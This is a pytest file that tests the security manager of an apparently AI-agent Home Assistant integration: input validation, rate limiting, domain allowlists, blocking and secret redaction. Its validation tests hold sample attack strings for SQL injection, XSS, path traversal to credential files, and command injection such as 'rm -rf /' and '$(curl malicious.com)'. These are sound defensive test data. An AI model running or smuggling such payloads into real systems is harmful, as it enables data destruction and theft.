"""Test security system functionality."""

import pytest
from unittest.mock import AsyncMock, MagicMock, patch
import time
from datetime import datetime, timedelta

from custom_components.glm_agent_ha.const import DOMAIN


@pytest.mark.security
class TestSecurityManager:
    """Test security manager functionality."""

    async def test_input_validation_sql_injection(self, hass_with_config):
        """Test SQL injection input validation."""
        hass = hass_with_config
        security_manager = hass.data[DOMAIN].get("security_manager")

        if security_manager:
            # Test various SQL injection patterns
            malicious_inputs = [
                "DROP TABLE users; --",
                "' OR '1'='1",
                "UNION SELECT * FROM passwords",
                "INSERT INTO users VALUES ('hacker', 'password')",
                "DELETE FROM automations WHERE 1=1; --"
            ]

            for input_text in malicious_inputs:
                is_valid, error_msg = security_manager.validate_input(input_text, "general", 1000)
                assert not is_valid, f"Should reject SQL injection: {input_text}"
                assert "malicious" in error_msg.lower() or "injection" in error_msg.lower()

    async def test_input_validation_xss(self, hass_with_config):
        """Test XSS input validation."""
        hass = hass_with_config
        security_manager = hass.data[DOMAIN].get("security_manager")

        if security_manager:
            xss_inputs = [
                "<script>alert('xss')</script>",
                "javascript:alert('xss')",
                "<img src=x onerror=alert('xss')>",
                "<svg onload=alert('xss')>",
                "onload=alert('xss')"
            ]

            for input_text in xss_inputs:
                is_valid, error_msg = security_manager.validate_input(input_text, "general", 1000)
                assert not is_valid, f"Should reject XSS: {input_text}"
                assert "malicious" in error_msg.lower() or "script" in error_msg.lower()

    async def test_input_validation_path_traversal(self, hass_with_config):
        """Test path traversal input validation."""
        hass = hass_with_config
        security_manager = hass.data[DOMAIN].get("security_manager")

        if security_manager:
            path_traversal_inputs = [
                "../../../etc/passwd",
                "..\\..\\windows\\system32\\config\\sam",
                "/etc/shadow",
                "C:\\Windows\\System32\\drivers\\etc\\hosts",
                "file:///etc/passwd"
            ]

            for input_text in path_traversal_inputs:
                is_valid, error_msg = security_manager.validate_input(input_text, "filename", 1000)
                assert not is_valid, f"Should reject path traversal: {input_text}"
                assert "path" in error_msg.lower() or "traversal" in error_msg.lower()

    async def test_input_validation_command_injection(self, hass_with_config):
        """Test command injection input validation."""
        hass = hass_with_config
        security_manager = hass.data[DOMAIN].get("security_manager")

        if security_manager:
            command_injection_inputs = [
                "; rm -rf /",
                "| cat /etc/passwd",
                "& echo 'hacked'",
                "`whoami`",
                "$(curl malicious.com)"
            ]

            for input_text in command_injection_inputs:
                is_valid, error_msg = security_manager.validate_input(input_text, "general", 1000)
                assert not is_valid, f"Should reject command injection: {input_text}"
                assert "malicious" in error_msg.lower() or "command" in error_msg.lower()

    async def test_valid_input_acceptance(self, hass_with_config):
        """Test that valid inputs are accepted."""
        hass = hass_with_config
        security_manager = hass.data[DOMAIN].get("security_manager")

        if security_manager:
            valid_inputs = [
                "Hello, how are you?",
                "Turn on the living room lights",
                "What's the temperature?",
                "Create automation for sunset",
                "Show me the camera feed"
            ]

            for input_text in valid_inputs:
                is_valid, error_msg = security_manager.validate_input(input_text, "prompt", 1000)
                assert is_valid, f"Should accept valid input: {input_text}"
                assert error_msg is None

    async def test_rate_limiting_basic(self, hass_with_config):
        """Test basic rate limiting functionality."""
        hass = hass_with_config
        security_manager = hass.data[DOMAIN].get("security_manager")

        if security_manager:
            client_id = "test_client_123"

            # Should allow first request
            is_allowed, rate_info = security_manager.check_rate_limit(client_id)
            assert is_allowed
            assert rate_info["remaining"] > 0

            # Make multiple requests to hit limit
            requests_made = 0
            while requests_made < 100:  # Should hit limit before this
                is_allowed, rate_info = security_manager.check_rate_limit(client_id)
                if not is_allowed:
                    break
                requests_made += 1

            # Should eventually be rate limited
            assert not is_allowed, "Should be rate limited after many requests"
            assert "blocked_until" in rate_info

    async def test_rate_limiting_different_clients(self, hass_with_config):
        """Test rate limiting for different clients."""
        hass = hass_with_config
        security_manager = hass.data[DOMAIN].get("security_manager")

        if security_manager:
            client_1 = "client_1"
            client_2 = "client_2"

            # Rate limit client 1
            for _ in range(100):
                is_allowed, _ = security_manager.check_rate_limit(client_1)
                if not is_allowed:
                    break

            # Client 2 should still be allowed
            is_allowed, rate_info = security_manager.check_rate_limit(client_2)
            assert is_allowed, "Different client should not be affected by rate limiting"

    async def test_rate_limiting_expiry(self, hass_with_config):
        """Test rate limiting block expiry."""
        hass = hass_with_config
        security_manager = hass.data[DOMAIN].get("security_manager")

        if security_manager:
            client_id = "test_client_expiry"

            # Exhaust rate limit
            for _ in range(200):
                is_allowed, _ = security_manager.check_rate_limit(client_id)
                if not is_allowed:
                    break

            # Should be blocked
            is_allowed, rate_info = security_manager.check_rate_limit(client_id)
            assert not is_allowed

            # Mock time passing (in real implementation, this would wait)
            with patch('time.time') as mock_time:
                # Advance time by 2 hours
                mock_time.return_value = time.time() + 7200

                # Should be allowed again
                is_allowed, rate_info = security_manager.check_rate_limit(client_id)
                assert is_allowed, "Should be allowed after rate limit expires"

    async def test_threat_detection_anomaly_detection(self, hass_with_config):
        """Test threat detection anomaly patterns."""
        hass = hass_with_config
        security_manager = hass.data[DOMAIN].get("security_manager")

        if security_manager:
            client_id = "anomaly_client"

            # Simulate high frequency requests (anomaly)
            requests = []
            for i in range(50):
                requests.append({
                    "timestamp": datetime.now(),
                    "client_id": client_id,
                    "input": f"Request {i}",
                    "success": True
                })

            # Analyze for anomalies
            threats = security_manager._analyze_request_patterns(requests)
            assert len(threats) > 0, "Should detect high frequency anomaly"

    async def test_domain_allowlisting(self, hass_with_config):
        """Test domain allowlisting functionality."""
        hass = hass_with_config
        security_manager = hass.data[DOMAIN].get("security_manager")

        if security_manager:
            # Test allowed domain
            assert security_manager.is_domain_allowed("api.openai.com")
            assert security_manager.is_domain_allowed("context7.com")

            # Test blocked domain
            assert not security_manager.is_domain_allowed("malicious-site.com")
            assert not security_manager.is_domain_allowed("suspicious-domain.net")

            # Test protocol validation
            assert not security_manager.is_domain_allowed("http://api.openai.com")  # HTTP not HTTPS
            assert security_manager.is_domain_allowed("https://api.openai.com")

    async def test_identifier_blocking(self, hass_with_config):
        """Test identifier blocking functionality."""
        hass = hass_with_config
        security_manager = hass.data[DOMAIN].get("security_manager")

        if security_manager:
            malicious_ip = "192.168.1.100"
            user_agent = "malicious-bot/1.0"

            # Block IP address
            security_manager.block_identifier(malicious_ip, "Test blocking", 24)

            # Check if blocked
            assert security_manager.is_blocked(malicious_ip)
            assert not security_manager.is_blocked("192.168.1.101")  # Different IP

            # Block user agent
            security_manager.block_identifier(user_agent, "Malicious bot", 48)
            assert security_manager.is_blocked(user_agent)

    async def test_data_sanitization(self, hass_with_config):
        """Test data sanitization functionality."""
        hass = hass_with_config
        security_manager = hass.data[DOMAIN].get("security_manager")

        if security_manager:
            # Test API key sanitization
            data_with_secrets = {
                "api_key": "sk-1234567890abcdef",
                "token": "secret_token_123",
                "password": "my_password",
                "normal_field": "normal_value",
                "openai_token": "sk-openai-123"
            }

            sanitized = security_manager.sanitize_data(data_with_secrets)

            # Check that secrets are redacted
            assert sanitized["api_key"] == "***REDACTED***"
            assert sanitized["token"] == "***REDACTED***"
            assert sanitized["password"] == "***REDACTED***"
            assert sanitized["openai_token"] == "***REDACTED***"
            assert sanitized["normal_field"] == "normal_value"  # Should remain unchanged

    async def test_security_event_logging(self, hass_with_config):
        """Test security event logging."""
        hass = hass_with_config
        security_manager = hass.data[DOMAIN].get("security_manager")
        structured_logger = hass.data[DOMAIN].get("structured_logger")

        if security_manager and structured_logger:
            with patch.object(structured_logger, "security_event") as mock_log:
                # Log a security event
                security_manager._log_security_event(
                    "injection_attempt",
                    "high",
                    "test_input_validation",
                    "SQL injection attempt detected",
                    client_id="test_client",
                    input_data="DROP TABLE users"
                )

                # Verify event was logged
                mock_log.assert_called_once()
                call_args = mock_log.call_args[1]
                assert call_args["event_type"] == "injection_attempt"
                assert call_args["severity"] == "high"


@pytest.mark.security
class TestSecurityServices:
    """Test security service endpoints."""

    async def test_security_report_service(self, hass_with_config):
        """Test security report service."""
        hass = hass_with_config

        result = await hass.services.async_call(
            DOMAIN,
            "security_report",
            {"hours": 24},
            blocking=True,
            return_result=True
        )

        assert "report_timestamp" in result
        assert "period_hours" in result
        assert result["period_hours"] == 24
        assert "security_features" in result
        assert result["security_features"]["rate_limiting_enabled"] is True

    async def test_security_validate_service(self, hass_with_config):
        """Test security validation service."""
        hass = hass_with_config

        # Test valid input
        result = await hass.services.async_call(
            DOMAIN,
            "security_validate",
            {
                "input": "Hello, how are you?",
                "type": "general"
            },
            blocking=True,
            return_result=True
        )

        assert result["is_valid"] is True
        assert result["input_type"] == "general"

        # Test malicious input
        result = await hass.services.async_call(
            DOMAIN,
            "security_validate",
            {
                "input": "DROP TABLE users; --",
                "type": "general"
            },
            blocking=True,
            return_result=True
        )

        assert result["is_valid"] is False
        assert "error_message" in result

    async def test_security_block_service(self, hass_with_config):
        """Test security block service."""
        hass = hass_with_config

        result = await hass.services.async_call(
            DOMAIN,
            "security_block",
            {
                "identifier": "192.168.1.200",
                "reason": "Test blocking",
                "duration": 1
            },
            blocking=True,
            return_result=True
        )

        assert result["identifier"] == "192.168.1.200"
        assert result["reason"] == "Test blocking"
        assert result["duration_hours"] == 1
        assert "blocked_at" in result

    async def test_security_domains_service(self, hass_with_config):
        """Test security domains management service."""
        hass = hass_with_config

        # List domains
        result = await hass.services.async_call(
            DOMAIN,
            "security_domains",
            {"action": "list"},
            blocking=True,
            return_result=True
        )

        assert "allowed_domains" in result
        assert isinstance(result["allowed_domains"], list)

        # Add domain
        await hass.services.async_call(
            DOMAIN,
            "security_domains",
            {
                "action": "add",
                "domain": "api.trusted-service.com"
            },
            blocking=True
        )

        # Remove domain
        await hass.services.async_call(
            DOMAIN,
            "security_domains",
            {
                "action": "remove",
                "domain": "api.suspicious-service.com"
            },
            blocking=True
        )


@pytest.mark.security
class TestSecurityIntegration:
    """Test security integration with other systems."""

    async def test_security_in_query_service(self, hass_with_config):
        """Test security integration in query service."""
        hass = hass_with_config

        security_manager = hass.data[DOMAIN].get("security_manager")
        if security_manager:
            with patch.object(security_manager, "validate_input") as mock_validate:
                mock_validate.return_value = (False, "Malicious input detected")

                with pytest.raises(Exception):
                    await hass.services.async_call(
                        DOMAIN,
                        "query",
                        {"prompt": "malicious input"},
                        blocking=True
                    )

                mock_validate.assert_called_once()

    async def test_security_in_automation_service(self, hass_with_config):
        """Test security integration in automation service."""
        hass = hass_with_config

        security_manager = hass.data[DOMAIN].get("security_manager")
        if security_manager:
            with patch.object(security_manager, "validate_input") as mock_validate:
                mock_validate.return_value = (True, None)

                with patch.object(hass.data[DOMAIN], "agent") as mock_agent:
                    mock_agent.async_create_automation = AsyncMock(return_value={"success": True})

                    await hass.services.async_call(
                        DOMAIN,
                        "create_automation",
                        {"prompt": "Turn on lights", "name": "Test"},
                        blocking=True
                    )

                    mock_validate.assert_called_once()

    async def test_security_events_fire(self, hass_with_config):
        """Test that security events fire properly."""
        hass = hass_with_config

        security_manager = hass.data[DOMAIN].get("security_manager")
        if security_manager:
            with patch.object(hass.bus, "async_fire") as mock_fire:
                # Fire a security event
                security_manager._log_security_event(
                    "test_event",
                    "medium",
                    "test_source",
                    "Test security event"
                )

                # Check that event was fired
                mock_fire.assert_called_once()
                event_data = mock_fire.call_args[0][1]
                assert event_data["event_type"] == "test_event"
                assert event_data["severity"] == "medium"

    async def test_security_with_mcp_integration(self, hass_with_config, mock_config_entry_pro):
        """Test security with MCP integration."""
        hass = hass_with_config

        security_manager = hass.data[DOMAIN].get("security_manager")
        if security_manager:
            # Test that MCP domains are properly validated
            mcp_domains = ["context7.com", "z.ai", "github.com"]
            for domain in mcp_domains:
                is_allowed = security_manager.is_domain_allowed(f"https://{domain}")
                # Should allow MCP domains for pro plans
                assert is_allowed, f"Should allow MCP domain: {domain}"